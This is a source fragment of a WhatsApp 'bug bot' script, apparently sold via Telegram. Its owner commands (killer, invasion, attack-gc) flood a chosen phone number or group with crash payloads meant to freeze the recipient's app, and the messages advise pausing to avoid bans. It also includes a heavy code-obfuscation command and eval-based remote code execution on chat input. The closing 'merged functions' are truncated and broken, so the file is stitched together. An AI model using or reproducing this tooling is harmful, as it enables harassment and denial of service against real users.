let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await vampire.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid number on WhatsApp !!!`)
prem.push(prrkek)
fs.writeFileSync("./lib/database/murbug.json", JSON.stringify(prem))
m.reply(`Sukses Added ${prrkek}  premium!`)
}
break      
      case "delprem":{
  const prem = JSON.parse(fs.readFileSync("./lib/database/murbug.json"))    
if (!isOwner) return reply('Only Owner!')
if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 254xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./lib/database/murbug.json", JSON.stringify(prem))
reply(`Sukses deleted ${ya} As a premium user!`)
}    
        break
  case 'self': {
if (!isOwner) return reply(mess.owner)
vampire.public = false
reply('succes')
}
break
case 'public': {
if (!isOwner) return reply(mess.owner)
vampire.public = true
reply('succes')
}
break               
                                    
                            
  
  case 'sc': case 'script': {
reply(`🌤️Sc buy from PAIN

❕Yt : ${global.yt}
❗Tl : t.me/@Elizzy22

`)
}
break
  case "killer-v1": case "killer-v2": case "killer-v3":case "killer-v4": case "killer-v5":  {
    if (!isOwner) return reply('command for owner only')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
     await reply(mess.bugrespon)     
    for (let i = 0; i < 10; i++) {
    await rebornnoclick(target)
    await rebornnoclick(target)
    await crashnull(target)
    await crashnull(target)
    await crashnull(target)
    await rebornnoclick(target)
    await rebornnoclick(target)
    await overloadButton(target);
    }
    await sleep(1000);
    await reply(mess.donebug)
await vampire.sendMessage(m.chat, { audio: {url: "https://files.catbox.moe/ph0dbw.m4a"}, mimetype: 'audio/mp4', ptt:true}, { quoted: m });     
}
break  
        case "invasion-v": case "invasion-v2": case "invasion-v3": {
    if (!isOwner) return reply('command for owner only')
    if (!q) return m.reply(`*Example: ${prefix + command} 254xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 254xxx_`);
    };
    let target = bijipler + "@s.whatsapp.net";
     await reply(mess.bugrespon)     
    for (let i = 0; i < 10; i++) {
    await close(target)
    await close(target)
    await close(target)
    await close(target)
    await close(target)
    await close(target)
    await close(target)
    }
    await sleep(1000);
    m.reply(`《 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 》
*ャ sᴇɴᴅ ʙᴜɢ ᴛᴏ* : *${target}*
*ャ ᴛʏᴘᴇ ʙᴜɢ* : *CRASH-UI*
> *PAUSE BUG 3 - 5 MINUTES TO AVOID BEING BANNED❗*`)
await vampire.sendMessage(m.chat, { audio: {url: "https://files.catbox.moe/ph0dbw.m4a"}, mimetype: 'audio/mp4', ptt:true}, { quoted: m });     
}
break 
    case 'invasion-v1':case  'invasion-v2': case 'invasion-v3':  {
             
    
    if (!isOwner) return reply("This Feature Only Send By Bot Number");

    vampire.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    await reply(mess.bugrespon)     
    //Paramater
    for (let r = 0; r < 15; r++) {
    await rebornnoclick(m.chat)
    await close(m.chat)
    await overloadButton(m.chat)
    await rebornnoclick(m.chat)
    await close(m.chat)
    await overloadButton(m.chat)
    await rebornnoclick(m.chat)
    await close(m.chat)
    await overloadButton(m.chat)
    }
    await sleep(1000)
          await reply(` Success.`)   
  console.log(chalk.red.bold("Success!"))
}
break;
   case "attack-gc":   case 'execute-gc': {
           
if (!isOwner) return m.reply(`Syntax Error!!
</> No Acces`)
let groupLink = text.split("|")[0].trim();
if (!groupLink.startsWith('https://chat.whatsapp.com/')) return m.reply(`Example : /${command} https://chat.whatsapp.com/xxx|5`);

let jumlah = parseInt(text.split("|")[1]);
if (isNaN(jumlah) || jumlah <= 0) return m.reply("Invalid jumlah value. It must be a number greater than 0.");

try {
// Extract invite code from the link
let inviteCode = groupLink.split("chat.whatsapp.com/")[1];
if (!inviteCode) return m.reply("INVALID LINK GROUP");
let groupInfo = await vampire.groupGetInviteInfo(inviteCode);
let groupId = groupInfo.id;
m.reply (`
⧼ 𝗦𝗨𝗞𝗦𝗘𝗦 𝗘𝗫𝗘𝗖𝗨𝗧𝗘 𝗚𝗥𝗢𝗨𝗣 ⧽

𝗧𝗔𝗥𝗚𝗘𝗧 : ${groupInfo.subject}
𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗦𝗨𝗞𝗦𝗘𝗦
𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 : *${command}*

> 𝗚𝗥𝗢𝗨𝗣 𝗦𝗨𝗗𝗔𝗛 𝗖𝗥𝗔𝗦𝗛`)
for (let i = 0; i < jumlah; i++) {
await Bug1(groupId);
await Bug1(groupId);
await Bug1(groupId);
await overloadButton(groupId);
await Bug1(groupId);
await Bug1(groupId);
await Bug1(groupId);
await overloadButton(groupId);
await overloadButton(groupId);

}
} catch (error) {
console.error("Error processing group link:", error);
}
}
break;
        case 'clearbugs': {
 
if (!isOwner) return m.reply(" only Premium ")
if (!q) return m.reply(`Example:\n ${prefix + command} 254xxxx`)
BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
vampire.sendMessage(BapakLuWkwk, {text: `Bug Cleared  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\na\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("*Done Fix Bug........* ")
}
break 
        case 'enc':
case 'encrypt': {
const JsConfuser = require('js-confuser')
if (!isOwner) return reply(mess.owner)

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return reply('❌ Please Reply File To Be Encryption.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return reply('❌ Please Reply File To Be Encryption.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return reply('❌ Please Reply File To Be Encryption.');
}
await vampire.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素PAIN晴PAIN晴" + "素PAIN晴PAIN晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIDDY晴TENNOR晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await vampire.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
•@Elizzy22`,
}, { quoted: m });

} catch (err) {
console.error('Error during encryption:', err);
await reply(`❌ An error occurred: ${error.message}`);
}
break;
}
      
      
    
                  
break  
      





                            
                                    
                
            
                            
                            

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});

// Merged functions from DYNAMIC-V3
function saveUser(userId) {
    // Load existing users
    let users = [];
    if (fs.existsSync(usersFile)) {
        try {
            const data = fs.readFileSync(usersFile, 'utf8');
            users = JSON.parse(data);
        }

function startXeony() {
    bot.on('callback_query', async (XeonBotInc) => {
        // Split the action and extract user ID
        const action = XeonBotInc.callbackQuery.data.split(' ');
        const user_id = Number(action[1]);

        // Check if the callback is from the correct user
        if (XeonBotInc.callbackQuery.from.id !== user_id) {
            return XeonBotInc.answerCbQuery('Oof! this button is not for you!', {
                show_alert: true
            }

function loadDatabase() {
if (global.db.READ) return new Promise((resolve) => setInterval(function () { (!global.db.READ ? (clearInterval(this), resolve(global.db.data == null ? global.loadDatabase() : global.db.data)) : null) }

function XeonBotIncStart() {
	
const { state, saveCreds }

function getMessage(key) {
        if (store) {
            const msg = await store.loadMessage(key.remoteJid, key.id)
            return msg
        }

function smsg(XeonBotInc, m, store) {
if (!m) return m
let M = proto.WebMessageInfo
if (m.key) {
m.id = m.key.id
m.isBaileys = m.id.startsWith('BAE5') && m.id.length === 16
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.sender = XeonBotInc.decodeJid(m.fromMe && XeonBotInc.user.id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = XeonBotInc.decodeJid(m.key.participant) || ''
}

const { addUserSession, isUserConnected } = require('./sessions');

// Modify the existing connect function to check session storage
function generatePairCode(phoneNumber) {
    if (isUserConnected(phoneNumber)) {
        return `User ${phoneNumber} is already connected!`;
    }

    const pairCode = Math.floor(100000 + Math.random() * 900000); // Generate 6-digit code
    addUserSession(phoneNumber, pairCode);
    return pairCode;
}
